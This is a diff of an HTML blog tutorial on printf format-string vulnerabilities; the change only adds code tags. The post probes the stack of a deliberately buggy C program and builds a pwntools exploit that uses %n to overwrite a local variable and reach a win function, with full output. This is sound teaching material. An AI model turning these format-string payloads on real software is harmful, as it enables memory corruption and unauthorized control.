@@ -113,7 +113,7 @@ the one who puts data to this variable.</p>
 
 <h4>What kind of string formaters can be used with printf family?</h4>
 <p>What's usual case of <em>printf</em>?</p>
-<pre class="code literal-block"><span></span><span class="c1">// example.c</span>
+<pre class="code literal-block"><span></span><code><span class="c1">// example.c</span>
 <span class="cp">#include</span> <span class="cpf">"stdio.h"</span><span class="cp"></span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -126,15 +126,15 @@ the one who puts data to this variable.</p>
             <span class="n">addr</span><span class="p">,</span> <span class="n">wordCount</span><span class="p">);</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre>
+</code></pre>
 
 
-<pre class="code literal-block"><span></span>$ gcc -o example -g -static example.c
+<pre class="code literal-block"><span></span><code>$ gcc -o example -g -static example.c
 $ ./example
 Starting at address 0x0806cd41 we search <span class="k">for</span> DEADBEEF.
 That message contains <span class="m">54</span> chars, and address 0x0806cd41.
 $ 
-</pre>
+</code></pre>
 
 
 <p>Here we can see 'basic' usage of this feature. I started with printing integer 
@@ -153,7 +153,7 @@ in the format string. Here I specify which arg I want to use by <code>%1$</code>
 <p>A full list of formaters you can find in <code>man 3 printf</code>.</p>
 <h4>How to use this knowledge</h4>
 <p>Les't take a buggy program:</p>
-<pre class="code literal-block"><span></span><span class="c1">// buggy.c</span>
+<pre class="code literal-block"><span></span><code><span class="c1">// buggy.c</span>
 <span class="cp">#include</span> <span class="cpf">"stdio.h"</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">"string.h"</span><span class="cp"></span>
 
@@ -182,7 +182,7 @@ in the format string. Here I specify which arg I want to use by <code>%1$</code>
         <span class="n">win</span><span class="p">();</span>
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre>
+</code></pre>
 
 
 <p>First, we want to print program output for the specially prepared string. What
@@ -198,7 +198,7 @@ amount of chars printed on the screen (useful for the usage of %n) I use
 <code>%016lx</code> - it prints 8 bytes hex values padded to full 16 characters. 
 A few tries show me that my string lays deep into the stack.</p>
 <p>This is what I've got:</p>
-<pre class="code literal-block"><span></span>$ python3 -c <span class="se">\</span>
+<pre class="code literal-block"><span></span><code>$ python3 -c <span class="se">\</span>
    <span class="s2">"print('Bob\nAAAABBBB'+''.join([f'-{i+128}.%{i+128}\$016lx' for i in range(32)])+'\n')"</span><span class="se">\</span>
    <span class="p">|</span> ./buggy
 Give me your name:
@@ -216,12 +216,12 @@ AAAABBBB-128.0000000000000000-129.00007f64ff3a2170-130.00007f64ff3a2170-
 <span class="m">155</span>.312d786c36313024-156.24383331252e3833-157.33312d786c363130-158.3024393331252e39-
 <span class="m">159</span>.3034312d786c3631
   -------ToDo-------
-</pre>
+</code></pre>
 
 
 <p>From program output, we can deduce that our string is a 136th argument on
 the stack. Let's check this with unique "DEADBEEF" (4645454244454144):</p>
-<pre class="code literal-block"><span></span>$ ./buggy
+<pre class="code literal-block"><span></span><code>$ ./buggy
 Give me your name:
 Bob
 Welcome Bob!...
@@ -231,7 +231,7 @@ OK! I am on it.
   -------ToDo-------
 DAEDBEEF.4645454244454144
   -------ToDo-------
-</pre>
+</code></pre>
 
 
 <p>Here I want to mention that there are few calling conventions 
@@ -248,14 +248,14 @@ something is missing or unspoken. And sometimes the problem lays in the
 'special way of compilation'.</p>
 <p>By default, <strong>gcc</strong> compile example <em>buggy</em> with some security techniques. This
 knowledge will be very important for the next step - exploiting. </p>
-<pre class="code literal-block"><span></span>$ checksec buggy
+<pre class="code literal-block"><span></span><code>$ checksec buggy
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">'./buggy'</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-</pre>
+</code></pre>
 
 
 <h4>The good part</h4>
@@ -264,7 +264,7 @@ be placed at a different memory location. So we cannot calculate proper
 address and overwrite target variable in one run of <em>scanf</em>/<em>printf</em>.
 Fortunately, there is another bug we can use. What's a coincidence.</p>
 <p>What if one overflows <em>name</em> variable. </p>
-<pre class="code literal-block"><span></span>$ python3 -c <span class="s2">"print(512*'A'+'try this:%s\n')"</span> <span class="p">|</span> ./buggy
+<pre class="code literal-block"><span></span><code>$ python3 -c <span class="s2">"print(512*'A'+'try this:%s\n')"</span> <span class="p">|</span> ./buggy
 Give me your name:
 tryNow tell me what to <span class="k">do</span>:
 OK! I am on it.
@@ -273,23 +273,23 @@ this:this:----ToDo-------
 o <span class="k">do</span>:
 
   -------ToDo-------
-</pre>
+</code></pre>
 
 
 <p>Hmm, one can do better.</p>
-<pre class="code literal-block"><span></span>$ python3 -c <span class="s2">"print(512*'A'+'name_address:_%p_')"</span> <span class="p">|</span> ./buggy 
+<pre class="code literal-block"><span></span><code>$ python3 -c <span class="s2">"print(512*'A'+'name_address:_%p_')"</span> <span class="p">|</span> ./buggy 
 Give me your name:
 name_address:_0x7fff163f0ad0_Now tell me what to <span class="k">do</span>:
 OK! I am on it.
   -------ToDo-------
 
   -------ToDo-------
-</pre>
+</code></pre>
 
 
 <p>So, we have an address of the <em>name</em> variable. From <strong>gdb</strong> we know the address
 of <em>decision</em> variable. </p>
-<pre class="code literal-block"><span></span><span class="err"> ...</span>
+<pre class="code literal-block"><span></span><code><span class="err"> ...</span>
 <span class="err">0x00000000000007e7 &lt;+82&gt;:  lea    rax,[rbp-0x610]  #name</span>
 <span class="err">0x00000000000007ee &lt;+89&gt;:  mov    rsi,rax</span>
 <span class="err">0x00000000000007f1 &lt;+92&gt;:  lea    rdi,[rip+0x18a]</span>
@@ -297,7 +297,7 @@ of <em>decision</em> variable. </p>
 <span class="err">0x00000000000007fd &lt;+104&gt;: call   0x640 &lt;__isoc99_scanf@plt&gt;</span>
 <span class="err"> ...</span>
 <span class="err">0x0000000000000873 &lt;+222&gt;: cmp    DWORD PTR [rbp-0x614],0x0</span>
-</pre>
+</code></pre>
 
 
 <p><em>decision</em> is 4 bytes above <em>name</em>. Exploit should extract <em>name</em> buffer
@@ -308,7 +308,7 @@ it, it would be a very short payload. So let's place it at the end:
 place. So <code>-%138$n</code> will be the 137th and out address 138th - this is why
 in the payload we have this value before <code>n</code>.</p>
 <p>So exploit which overwrites <em>decision</em> variable looks like this:</p>
-<pre class="code literal-block"><span></span><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span>
+<pre class="code literal-block"><span></span><code><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./buggy'</span><span class="p">)</span>
@@ -326,10 +326,10 @@ in the payload we have this value before <code>n</code>.</p>
 <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'AAAAAAAA-%138$n-'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
-</pre>
+</code></pre>
 
 
-<pre class="code literal-block"><span></span>$ python3 buggy_exploit.py
+<pre class="code literal-block"><span></span><code>$ python3 buggy_exploit.py
 <span class="o">[</span>+<span class="o">]</span> Starting program <span class="s1">'./buggy'</span>: Done
 b<span class="s1">'Give me your name:\n'</span>
 b<span class="s1">'__0x7ffc26994b00__Now tell me what to do:\n'</span>
@@ -337,7 +337,7 @@ address: b<span class="s1">'0x7ffc26994b00'</span>
 address of boolean: 0x7ffc26994afc
 b<span class="s1">'OK! I am on it.\n  -------ToDo-------\nAAAAAAAA--\xfcJ\x99&amp;\xfc\x7f\n  -------ToDo-------\n==============WIN===============\n         OK, you win!\n==============WIN===============\n'</span>
 <span class="o">[</span>*<span class="o">]</span> Program <span class="s1">'./buggy'</span> stopped with <span class="nb">exit</span> code <span class="m">0</span>
-</pre>
+</code></pre>
 
 
 <p>It's not the end of this topic. What I've learned from this, but not expected to, 
